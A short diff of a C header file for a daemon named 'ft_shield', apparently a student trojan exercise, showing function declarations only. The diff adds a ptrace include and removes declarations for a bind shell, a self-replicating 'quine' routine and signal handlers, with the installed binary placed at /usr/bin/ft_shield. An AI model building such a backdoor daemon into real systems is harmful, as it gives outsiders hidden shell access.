@@ -22,6 +22,7 @@
 #include <signal.h>
 #include <openssl/evp.h>
 #include <openssl/sha.h>
+#include <sys/ptrace.h>
 
 #define LOCK_FILE "/var/lock/ft_shield.lock"
 #define TARGET_PATH "/usr/bin/ft_shield"
@@ -48,30 +49,15 @@ typedef struct s_server
 	DAEMON
 */
 
-// void	skeleton_daemon(void);
 int		check_lock_file(void);
 void	remove_lock_file(int fd);
 void	daemonize(void);
 
 /*
-	QUINE
-*/
-
-// void	replicate(void);
-
-/*
-	SIGNALS
-*/
-
-int		create_signal_fd(void);
-void	handle_signals(struct pollfd *pfds, int *shutdown);
-int		setup_signal_fd(void);
-
-/*
 	SERVER
 */
 
-void	start_server(void);
+void	server(void);
 void	remove_client(t_server *server, int client_fd);
 void	send_to_client(t_server* server, int client_fd, char* buffer);
 
@@ -89,5 +75,3 @@ void handle_command(t_server* server, int client_fd, char* buffer);
 /*
 	BIND SHELL
 */
-void	bind_shell(int client_fd);
-void	server(void);
